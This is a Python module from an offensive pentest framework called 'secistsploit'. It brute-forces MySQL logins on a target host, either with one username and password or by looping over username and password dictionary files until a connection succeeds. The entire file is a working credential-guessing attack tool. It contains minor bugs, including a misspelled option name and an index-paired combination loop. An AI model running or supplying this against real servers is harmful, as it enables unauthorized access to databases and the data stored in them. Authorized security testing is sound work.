#-*-coding:utf-8-*-
import pymysql
import os
from secistsploit.core.exploit import *
from secistsploit.core.tcp.tcp_client import TCPClient


class Exploit(TCPClient):
    __info__ = {
        "name": "mysql_login",
        "description": "mysql_login",
        "authors": (
            "jiushi",
        ),
        "references": (
             "www.422926799.github.io"
             "www.422926799.github.io"
        ),

    }

    rhost=OptIP("",'Target IP')
    rport=OptPort(3306,"Target port")
    usernaeme=OptString("root","Target username")
    password=OptString("root","Target Password")
    userfile=OptString("","Target username dict")
    passwdfile=OptString("","Target password dict")
    def __init__(self):
        self.endianness = "<"
    def run(self):
        rhost=(self.rhost)
        rport=(self.rport)
        username=(self.usernaeme)
        password=(self.password)
        userfile=(self.userfile)
        passwdfile=(self.passwdfile)
        if rhost!='' and rport!='' and username!='' and password !='':
            try:
                connect=pymysql.connect(host=rhost,port=rport,user=username,passwd=password)
                print('[+] Mysql Connect {}:{} username:{} password:{} ok'.format(rhost,rport,username,password))
            except:
                print('[-] Mysql Connect {}:{} username:{} password:{} found'.format(rhost,rport,username,password))
        if rhost!='' and rport!='' and username!='' and password=='' and passwdfile!='':
            if os.path.exists(passwdfile):
                print('[+] {} ok'.format(passwdfile))
            else:
                print('[-] {} Not Found'.format(passwdfile))

            dk=open(passwdfile,'r')
            for r in dk.readlines():
                qc="".join(r.split('\n'))
                try:
                    connect = pymysql.connect(host=rhost, port=rport, user=username, passwd=qc)
                    print('[+] Mysql Connect {}:{} username:{} password:{} ok'.format(rhost, rport, username, qc))
                    break
                except:
                    print('[-] Mysql Connect {}:{} username:{} password:{} found'.format(rhost, rport, username,qc))
        if rhost!='' and rport!='' and username=='' and userfile!='' and password!='':
            if os.path.exists(userfile):
                print('[+] {} ok'.format(userfile))
            else:
                print('[-] {} Not Found'.format(userfile))

            dk=open(userfile,'r')
            for r in dk.readlines():
                qc2="".join(r.split('\n'))
                try:
                    connect = pymysql.connect(host=rhost, port=rport, user=qc2, passwd=password)
                    print('[+] Mysql Connect {}:{} username:{} password:{} ok'.format(rhost, rport, qc2, password))
                    break
                except:
                    print('[-] Mysql Connect {}:{} username:{} password:{} found'.format(rhost, rport, qc2,password))
        if rhost!='' and rport!='' and username=='' and userfile!='' and password=='' and passwdfile!='':
            usernamesd=[]
            passwordsd=[]
            if os.path.exists(userfile):
                print('[+] userfile:{} ok'.format(userfile))
            else:
                print('[-] userfile:{} Not Found')

            dk=open(userfile,'r')
            for u in dk.readlines():
                qcs="".join(u.split('\n'))
                usernamesd.append(qcs)

            if os.path.exists(passwdfile):
                print('[+] passwdfile:{} ok'.format(passwdfile))
            else:
                print('[-] passwdfile {} Not Found'.format(passwdfile))

            dk2=open(passwdfile,'r')
            for p in dk2.readlines():
                qcs2="".join(p.split('\n'))
                passwordsd.append(qcs2)

            for k in range(0,len(usernamesd)):
                try:
                    connect = pymysql.connect(host=rhost, port=rport, user=usernamesd[k], passwd=passwordsd[k])
                    print('[+] Mysql Connect {}:{} username:{} password:{} ok'.format(rhost, rport, usernamesd[k], passwordsd[k]))
                    break
                except:
                    print('[-] Mysql Connect {}:{} username:{} password:{} found'.format(rhost, rport, usernamesd[k],passwordsd[k]))